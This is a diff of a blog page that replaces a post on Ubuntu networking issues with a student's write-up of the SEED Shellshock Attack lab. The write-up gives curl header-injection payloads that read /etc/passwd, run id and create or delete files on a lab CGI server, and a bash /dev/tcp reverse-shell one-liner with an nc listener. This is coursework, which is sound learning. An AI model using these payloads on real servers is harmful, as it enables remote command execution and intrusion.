@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="解决虚拟机无法联网的问题">
+  <meta name="description" content="软件安全课程实验2 Shellshock Attack lab">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>虚拟机网络托管消失的问题 - Zino&#39;s Blog</title>
+  <title>Shellshock Attack lab - Zino&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="虚拟机网络托管消失的问题">
+            <span class="h2" id="subtitle" title="Shellshock Attack lab">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-27 20:45" pubdate>
-        2021年11月27日 晚上
+      <time datetime="2021-10-29 10:54" pubdate>
+        2021年10月29日 上午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      731 字
+      838 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      12
        分钟
     </span>
   
@@ -233,62 +233,80 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">虚拟机网络托管消失的问题</h1>
+            <h1 style="display: none">Shellshock Attack lab</h1>
             
             <div class="markdown-body">
-              <p>如图所示，Ubuntu20.04频繁出现网络未托管的现象，右上角网络连接图标消失</p>
-<p><img src="/1326caf9/image-20211127204523849.png" srcset="/img/loading.gif" lazyload alt="image-20211127204523849"></p>
-<p>虚拟机的网络除了可以修改/etc/network/interfaces来进行配置以外；还可以直接在network-manager中配置。</p>
+              <h1 id="shellshock_attack_lab"><a class="markdownIt-Anchor" href="#shellshock_attack_lab"></a> Shellshock_Attack_lab</h1>
+<h2 id="task-1"><a class="markdownIt-Anchor" href="#task-1"></a> task 1</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vul.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>	setuid(geteuid());<br>	system(<span class="hljs-string">&quot;/bin/ls -l&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>首先准备有漏洞的程序vul.c</p>
+<p>然后我们编译运行，并将其变成一个set-UID程序</p>
+<p>因为Ubuntu20.04中/bin/sh指向/bin/dash，而这个程序没有shellshock漏洞，所以需要更改符号链接，采用命令</p>
+<p><code>sudo ln -sf /bin/bash_shellshock /bin/sh</code></p>
+<p>同时我们发现20.04中/bin文件夹下没有bash_shellshock文件，所以我们需要sudo su进入root后自己cp一下。</p>
+<p>我们定义一个shell变量foo并输出它，这样当运行set-UID程序（vul)时，shell变量会变成子进程的环境变量。由于system函数的原因，Bash会被调用，它监测到环境变量foo中存放了一个环境声明，因此会解析该声明，由于逻辑解析的漏洞，它最终会执行放在末尾的/bin/sh指令，所以我之后会成功进入一个具有root权限的shell程序。</p>
+<p><img src="/image-20211027172958405.png" srcset="/img/loading.gif" lazyload alt="image-20211027172958405"></p>
+<p><img src="/image-20211027173023492.png" srcset="/img/loading.gif" lazyload alt="image-20211027173023492"></p>
+<p>将链接改回去后再次执行vul,我们发现程序正常，没有被攻击。</p>
+<p><img src="/image-20211027174008884.png" srcset="/img/loading.gif" lazyload alt="image-20211027174008884"></p>
+<h2 id="task-2"><a class="markdownIt-Anchor" href="#task-2"></a> task 2</h2>
+<h3 id="task-2a-using-brower"><a class="markdownIt-Anchor" href="#task-2a-using-brower"></a> task 2.A: Using brower</h3>
+<p><img src="/image-20211027180800482.png" srcset="/img/loading.gif" lazyload alt="image-20211027180800482"></p>
+<p><img src="/image-20211027180830505.png" srcset="/img/loading.gif" lazyload alt="image-20211027180830505"></p>
+<p>Apache服务器会从http请求头中获取信息，赋值给CGI程序的环境变量。</p>
+<h3 id="task-2b-using-curl"><a class="markdownIt-Anchor" href="#task-2b-using-curl"></a> task 2.B Using curl</h3>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+<p>-v  打印出http请求头</p>
+<p><img src="/image-20211028162819689.png" srcset="/img/loading.gif" lazyload alt="image-20211028162819689"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+<p>-A  设置User-Agent</p>
+<p><img src="/image-20211028162913084.png" srcset="/img/loading.gif" lazyload alt="image-20211028162913084"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+<p>-e 设置Referer字段</p>
+<p><img src="/image-20211028163009475.png" srcset="/img/loading.gif" lazyload alt="image-20211028163009475"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure>
+<p>-H 设置额外头字段</p>
+<p><img src="/image-20211028163108646.png" srcset="/img/loading.gif" lazyload alt="image-20211028163108646"></p>
+<h2 id="task-3"><a class="markdownIt-Anchor" href="#task-3"></a> task 3</h2>
+<h3 id="task-3a"><a class="markdownIt-Anchor" href="#task-3a"></a> Task 3.A:</h3>
 <ul>
-<li>
-<p>通过 interfaces修改的方法参照Server版本。</p>
-</li>
-<li>
-<p>network-manager的配置很直观，按照提示一步一步操作即可，有兴趣的朋友，可以自行Google或者Baidu。</p>
-</li>
+<li><strong>Get the server to send back the content of the /etc/passwd file.</strong></li>
 </ul>
-<p>但如果修改了interfaces，又配置了network-manager（以下简称nm），就可能会出现了一些莫名其妙的问题:</p>
-<ol>
-<li>
-<p>interfaces和 nm中的网络设置不一样，系统实际的IP是哪个？</p>
-</li>
-<li>
-<p>有时候莫名其妙的，界面右上角的网络连接图标就丢失了。</p>
-</li>
-<li>
-<p>明明在nm中配置了正确的网络设置，为什么就上不了网呢？</p>
-</li>
-</ol>
-<p>首先，当系统内没有第三方网络管理工具（比如nm）时，系统默认使用interfaces文件内的参数进行网络配置。（就像Server版本一样）</p>
-<p>接着，当系统内安装了 nm之后，nm默认接管了系统的网络配置，使用nm 自己的网络配置参数来进行配置。</p>
-<p>但是，如果用户在安装nm之后，自己手动修改了interfaces 文件，那nm就自动停止对系统网络的管理，系统改使用interfaces 文件内的参数进行网络配置。</p>
-<p>此时，再去修改nm 内的参数，不影响系统实际的网络配置。若要让nm 内的配置生效，必须重新启用nm 接管系统的网络配置。</p>
-<p>现在知道了两者之间的工作关系，再看上面的三个问题：</p>
-<ol>
-<li>
-<p>要看nm是否接管，如果没有接管，系统实际的IP设置以interfaces 中的为准。反之，以nm 中的为准。</p>
-</li>
-<li>
-<p>当nm 停止接管的时候，网络连接图标就丢失了。</p>
-</li>
-<li>
-<p>同样是接管的问题。</p>
-</li>
-</ol>
-<p>如果用户希望直接使用interfaces 进行网络配置，那最好删除network-manager 。</p>
-<p>如果在出现上述问题之后，希望能继续使用nm 来进行网络配置，则需要进行如下操作：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs terminal"># 停止 nm服务<br>sudo service network-manager stop <br># 打开nm 的配置文件(具体配置文件名字进入目录看，可能不太一样)<br>sudo vim /etc/NetworkManager/NetworkManager.conf <br></code></pre></td></tr></table></figure>
-<p><strong>里面有一行：managed=true</strong></p>
-<p><strong>如果你手工改过/etc/network/interfaces，nm会自己把这行改成：managed=false</strong></p>
-<p><strong>将false 修改成true</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal">#重启nm服务<br>sudo service network-manager start<br></code></pre></td></tr></table></figure>
-<p>然后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs terminal"># 开启NM托管<br>nmcli n on<br></code></pre></td></tr></table></figure>
-<p>有时候开关机后网络连接图标仍会消失，查看配置文件已经设置为了true,这时候再执行一遍下面三条命令后可以成功恢复网络。</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">sudo service network-manager <span class="hljs-built_in">stop</span><br>sudo service network-manager <span class="hljs-built_in">start</span><br>nmcli n <span class="hljs-keyword">on</span><br></code></pre></td></tr></table></figure>
-<p><strong>参考链接</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vic_qxz/article/details/118863177?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-2&amp;spm=1001.2101.3001.4242.1"> NetworkManager设置_networkmanager配置文件</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sankye/p/5020721.html?ivk_sa=1024320u">Ubuntu中启用关闭Network-manager网络设置问题</a></p>
+<p>利用了-A修改User-Agent字段</p>
+<p>执行命令</p>
+<p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/image-20211028165749466.png" srcset="/img/loading.gif" lazyload alt="image-20211028165749466"></p>
+<h3 id="task-3b"><a class="markdownIt-Anchor" href="#task-3b"></a> Task 3.B:</h3>
+<p><strong>Get the server to tell you its process’ user ID. Y ou can use the /bin/id command to print out the ID information.</strong></p>
+<p>利用-e修改Referer字段来获取ID</p>
+<p>执行命令</p>
+<p><code>curl -e &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/image-20211028170325981.png" srcset="/img/loading.gif" lazyload alt="image-20211028170325981"></p>
+<h3 id="task-3c"><a class="markdownIt-Anchor" href="#task-3c"></a> Task 3.C:</h3>
+<p><strong>Get the server to create a file inside the /tmp folder. Y ou need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</strong></p>
+<p><img src="/image-20211028172005730.png" srcset="/img/loading.gif" lazyload alt="image-20211028172005730"></p>
+<p>利用-H创建额外头字段</p>
+<p>查看tmp</p>
+<p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/ls /tmp &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p>创建test</p>
+<p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/touch /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/image-20211028193945048.png" srcset="/img/loading.gif" lazyload alt="image-20211028193945048"></p>
+<h3 id="task-3d"><a class="markdownIt-Anchor" href="#task-3d"></a> Task 3.D:</h3>
+<p><strong>Get the server to delete the file that you just created inside the /tmp folder</strong></p>
+<p>删除test</p>
+<p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
+<p><img src="/image-20211028194013384.png" srcset="/img/loading.gif" lazyload alt="image-20211028194013384"></p>
+<p>Q1:不能打开/etc/shadow，因为只是www-data权限，权限不够，需要root权限</p>
+<p>Q2：不能成功，不能成功将带空格的字符串设置为环境变量，所以不能攻击成功</p>
+<h2 id="test-4"><a class="markdownIt-Anchor" href="#test-4"></a> test 4</h2>
+<p><code>nc -lvnp 9090</code></p>
+<p><img src="/image-20211028205201563.png" srcset="/img/loading.gif" lazyload alt="image-20211028205201563"></p>
+<p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code></p>
+<p><img src="/image-20211028205013091.png" srcset="/img/loading.gif" lazyload alt="image-20211028205013091"></p>
+<p><img src="/image-20211028205206476.png" srcset="/img/loading.gif" lazyload alt="image-20211028205206476"></p>
+<h2 id="test-5"><a class="markdownIt-Anchor" href="#test-5"></a> test 5</h2>
+<p>新建一个vul.cgi修改为bash后，重新dcbuild一个容器，后再次执行攻击，发现攻击无法成功。因为bash填补了shellshock漏洞，所以无法攻击成功。</p>
+<p><img src="/image-20211028211429143.png" srcset="/img/loading.gif" lazyload alt="image-20211028211429143"></p>
 
             </div>
             <hr>
@@ -298,7 +316,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/bug/">bug</a>
+                      <a class="hover-with-bg" href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a>
                     
                   </div>
                 
@@ -306,7 +324,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/linux%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/">linux网络问题</a>
+                      <a class="hover-with-bg" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a>
                     
                   </div>
                 
@@ -323,9 +341,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/60fc7e01/">
+                      <a href="/e11b459a.html">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">syzkaller配置小结</span>
+                        <span class="hidden-mobile">操作系统实验一</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -333,8 +351,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/8ce3e425/">
-                        <span class="hidden-mobile">操作系统笔记</span>
+                      <a href="/3c8e3d23.html">
+                        <span class="hidden-mobile">环境变量和set-UID程序</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -356,8 +374,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://zino00.github.io/1326caf9/';
-          this.page.identifier = '/1326caf9/';
+          this.page.url = 'https://zino00.github.io/35f73974.html';
+          this.page.identifier = '/35f73974.html';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
